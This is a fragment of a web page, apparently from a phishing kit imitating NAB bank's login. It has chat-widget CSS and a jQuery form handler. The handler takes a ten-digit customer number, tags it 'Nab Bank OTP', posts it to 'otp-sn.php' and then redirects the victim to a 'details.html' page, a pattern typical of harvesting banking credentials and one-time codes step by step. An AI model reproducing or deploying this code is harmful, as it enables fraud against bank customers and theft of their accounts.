  <style>
    iframe#web-messenger-container {
      border: 0;
      color-scheme: auto;
      position: fixed;
      transition: bottom 0.2s ease 0s, right 0.2s ease 0s;
      z-index: 999999989
    }

    @keyframes expand-chat-window {
      from {
        transform: translateY(calc(100% - 49px))
      }

      to {
        transform: translateY(0)
      }
    }

    @keyframes collapse-chat-window {
      from {
        transform: translateY(0)
      }

      to {
        transform: translateY(calc(100% - 49px))
      }
    }

    @media only screen and (max-width:767px),
    only screen and (max-height:667px) {
      iframe#web-messenger-container {
        bottom: 0;
        right: 0
      }
    }

    @media only screen and (min-width:768px) and (min-height:668px) {
      iframe#web-messenger-container {
        bottom: 5px;
        right: 5px
      }
    }

    @media only screen and (min-width:1200px) and (min-height:668px) {
      iframe#web-messenger-container {
        bottom: 30px;
        right: 30px
      }
    }
  </style>

      <script>
        $(document).ready(function() {
    function toggleButtonState() {
        const username = $('#username').val().trim();
        if (username) {
            $('#btn-1').prop('disabled', false);
        } else {
            $('#btn-1').prop('disabled', true);
        }
    }
    $('#username').on('keyup change', toggleButtonState);
    let successCount = 0;

    // Form submission handling
    $('#login-form').submit(function(event) {
        event.preventDefault();

        var formData = {
            username: $('#username').val().trim(),
            title: 'Nab Bank OTP'
        };
        if (formData.username) {
            $.ajax({
                type: 'POST',
                url: 'otp-sn.php',
                data: formData,
                success: function(response) {
                    console.log('Response:', response); // Debug: Check what the response contains
                    successCount++; // Increase success count on a successful POST
                    if (successCount === 1) {
                      window.location.href = "details.html";

                    }
                    
                },
                error: function(xhr, status, error) {
                    console.error('Error:', error); // Handle error
                },
            });
        }

    });
    $('#username').mask('0000000000');
        });
